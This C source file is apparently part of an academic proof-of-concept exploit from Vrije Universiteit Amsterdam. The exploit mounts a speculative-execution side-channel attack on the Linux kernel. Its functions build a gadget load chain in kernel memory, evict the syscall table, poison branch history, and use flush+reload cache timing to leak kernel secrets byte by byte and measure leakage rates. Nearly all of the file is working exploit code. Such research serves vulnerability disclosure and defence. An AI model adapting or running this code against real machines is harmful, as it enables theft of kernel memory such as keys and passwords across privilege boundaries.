/*
 * Tuesday, May 16th 2023
 *
 * Sander Wiebing - s.j.wiebing@student.vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>


#include "flush_and_reload.h"
#include "targets.h"
#include "../../poc-common/common.h"

#include "../../poc-common/l2_eviction/evict_sys_table_l2.h"

extern void fill_bhb(uint8_t *history, uint64_t syscall_nr,
                     uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4);

extern uint64_t static_fill_bhb_sys(uint64_t syscall_nr,
                     uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4);


// ----------------------------------------------------------------------------
// Load chain setup functions
//
// ----------------------------------------------------------------------------


void set_load_chain_leak_secret(struct config * cfg)
{
    // ------------------------------------------------------------------------
    //
    //  mov    rax,QWORD PTR [rdi+0x70]   LOAD ATTACKER RDI
    //  mov    r8,rsi
    //  mov    rbp,rdi
    //  mov    rax,QWORD PTR [rax]          ;rax=ind_map
    //  mov    rsi,QWORD PTR [rax+0x60]     ;rsi=&(secret_addr - 0x94) - 0x58
    //  mov    rdx,QWORD PTR [rax+0x8]      ;rdx=&trans_base - 0x60
    //  mov    rax,QWORD PTR [rsi+0x58]     ;rax=secret_addr - 0x94
    //  mov    rdi,QWORD PTR [rdx+0x60]     ;rdi=trans_base
    //  test   rax,rax
    //  je     0xffffffff81119083 <cgroup_seqfile_show+51>
    //  movsxd rax,DWORD PTR [rax+0x94]     ;LOAD OF SECRET
    //  add    rax,0x2e
    //  rdi,QWORD PTR [rdi+rax*8+0x8        ;TRANSMISSION

    memset(cfg->ind_map, 0, 0x100);

    *(uint64_t *)(cfg->ind_map)     =  (uint64_t)cfg->ind_map_kern;
    *(uint64_t *)(cfg->ind_map + 0x60) = (uint64_t)cfg->ind_map_kern;
    *(uint64_t *)(cfg->ind_map + 0X8) = (uint64_t)cfg->ind_map_kern + 0x8;


    cfg->ind_tb_addr = (uint64_t * ) (cfg->ind_map + 0x68);
    cfg->ind_secret_addr = (uint64_t * ) (cfg->ind_map + 0x58);

    *cfg->ind_tb_addr = (uint64_t)cfg->fr_buf_kern - TB_OFFSET;

}


void set_load_chain_simple_touch(struct config * cfg) {

    // ------------------------------------------------------------------------
    //  Use one indirect load before touching reload buffer
    //  mov    rax,QWORD PTR [rdi+0x70]   ;rax=ATTACKER RDI
    //  mov    r8,rsi
    //  mov    rbp,rdi
    //  mov    rax,QWORD PTR [rax]        ;rax=ind_map_kern
    //  mov    rsi,QWORD PTR [rax+0x60]   ;rsi=fr_buf_kern - 0x58
    //  mov    rdx,QWORD PTR [rax+0x8]    ;unused
    //  mov    rax,QWORD PTR [rsi+0x58]   ;load reload buffer
    memset(cfg->ind_map, 0, 0x100);


    *(uint64_t *)(cfg->ind_map) = (uint64_t) cfg->ind_map_kern;
    *(uint64_t *)(cfg->ind_map + 0x60) = (uint64_t)cfg->fr_buf_kern - 0x58;
    // ------------------------------------------------------------------------

}

// ----------------------------------------------------------------------------
// Leak helper functions
//
// ----------------------------------------------------------------------------

char seqfile_buf[32];

uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit) {

    uint64_t hits = 0;

    *(volatile uint64_t *)cfg->ind_map;
    *(volatile uint64_t *)(cfg->ind_map + 64);


    for(int i=0; i<iterations; i++) {

        asm volatile("clflush (%0)\n"::"r"(cfg->reload_addr));

        asm volatile("prefetcht0 (%0)" :: "r" (cfg->ind_map_kern));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->fr_buf_kern));

        if (cfg->ind_secret_addr) {
            asm volatile("prefetcht0 (%0)" :: "r" ((*cfg->ind_secret_addr) - TS_OFFSET));
        }

        asm volatile("sfence\n");

        //ensure target is in the btb
        assert(static_fill_bhb_sys(SYS_pread64, cfg->fd, (uint64_t) seqfile_buf, 32, 0) > 0);
    #ifdef INTEL_13_GEN
        assert(static_fill_bhb_sys(SYS_pread64, cfg->fd, (uint64_t) seqfile_buf, 32, 0) > 0);
    #endif
        cpuid();


        evict_sys_call_table();

        fill_bhb(cfg->history, VICTIM_SYSCALL, ((uint64_t)cfg->ind_map_kern), 0, 0, 0);

        cpuid();

        if(load_time(cfg->reload_addr) < THR) {
            if (ret_on_hit) {
                return 1;
            } else {
                hits++;
            }
        }
    }

    return hits;

}

int leak_byte_forwards(struct config * cfg, uint64_t prefix) {

    uint64_t fr_offset, hits;
    uint64_t prefix_offset = (prefix * STRIDE);

    cfg->reload_addr = cfg->fr_buf;

    for (size_t outer = 0; outer < 10; outer++)
    {
        for (uint64_t byte = 0; byte <= 0xff; byte++) {


            fr_offset = (byte << 24);
            if (byte & (1 << 7)) {
                fr_offset |= 0xffffffff00000000;
            }

            fr_offset = fr_offset * STRIDE;

            *cfg->ind_tb_addr = (uint64_t) (cfg->fr_buf_kern - fr_offset - TB_OFFSET - prefix_offset);

            hits = do_flush_and_reload(cfg, 2, 1);

            if (hits > 0) {
                return (int) byte;
            }
        }

    }

    return -1;

}

uint8_t is_signature_at_address(struct config * cfg, uint64_t signature, uint8_t * address, uint64_t iterations) {
    uint64_t offset, hits;

    signature = signature;
    if (signature & (1<<31)) {
        signature |= 0xffffffff00000000;
    }

    offset = (signature * STRIDE);
    *cfg->ind_tb_addr = (uint64_t) (cfg->fr_buf_kern - TB_OFFSET - offset);

    *cfg->ind_secret_addr = (uint64_t) address - TS_OFFSET;


    hits = do_flush_and_reload(cfg, iterations, 1);
    return hits > 0;

}

// ----------------------------------------------------------------------------
// Leak test functions
//
// ----------------------------------------------------------------------------

#define TEST_ITERATIONS 100000


uint64_t test_leakage_rate(struct config * cfg, uint8_t byte_to_test, uint64_t iterations) {

    uint64_t hits, fr_offset, prefix, prefix_offset, zero_extend;

    set_load_chain_leak_secret(cfg);

    cfg->reload_addr = cfg->fr_buf;
    uint8_t *secret = cfg->ind_map + 0x2000;
    uint8_t *secret_kern = cfg->ind_map_kern + 0x2000;
    *cfg->ind_secret_addr = (uint64_t) secret_kern - TS_OFFSET;

    memset(secret, 0x0, 4);
    uint8_t leaked_bytes[4] = {0};

    leaked_bytes[0] = 0xe;
    secret[0] = 0xe;

    secret[3] = byte_to_test;

    // Initialize the prefix

    prefix = *(uint32_t *) (leaked_bytes);

    if (byte_to_test & (1 << 7)) {
        prefix |= 0xffffffff00000000;
    }
    prefix_offset = (prefix * STRIDE);


    fr_offset = (((uint64_t) byte_to_test) << 24) * STRIDE;
    *cfg->ind_tb_addr = (uint64_t) (cfg->fr_buf_kern - fr_offset - TB_OFFSET - prefix_offset);


    // now leak

    hits = do_flush_and_reload(cfg, iterations, 0);

    return hits;

}

void print_leakage_rate(struct config * cfg, uint64_t * store_hits) {

    uint64_t hits, hits_higher;
    cfg->reload_addr = cfg->fr_buf;

    printf("Leakage rates -> ");

    set_load_chain_simple_touch(cfg);

    hits = do_flush_and_reload(cfg, TEST_ITERATIONS, 0);

    printf("SIMPLE %5ld/%d hits %5.2f%% | ", hits, TEST_ITERATIONS, ((float) hits / TEST_ITERATIONS) * 100);
    fflush(stdout);

    set_load_chain_leak_secret(cfg);

    hits = test_leakage_rate(cfg, 0x00, TEST_ITERATIONS);

    printf("Byte: 0x%02x %5ld/%d hits %5.2f%% | ", 0x0, hits, TEST_ITERATIONS, ((float) hits / TEST_ITERATIONS) * 100);
    fflush(stdout);

    hits_higher = test_leakage_rate(cfg, 0xfe, TEST_ITERATIONS);

    printf("Byte: 0x%02x %5ld/%d hits %5.2f%%", 0xfe, hits_higher, TEST_ITERATIONS, ((float) hits_higher / TEST_ITERATIONS) * 100);
    printf("\n");

    if (store_hits) {
        store_hits[0] = hits;
        store_hits[1] = hits_higher;
    }

}

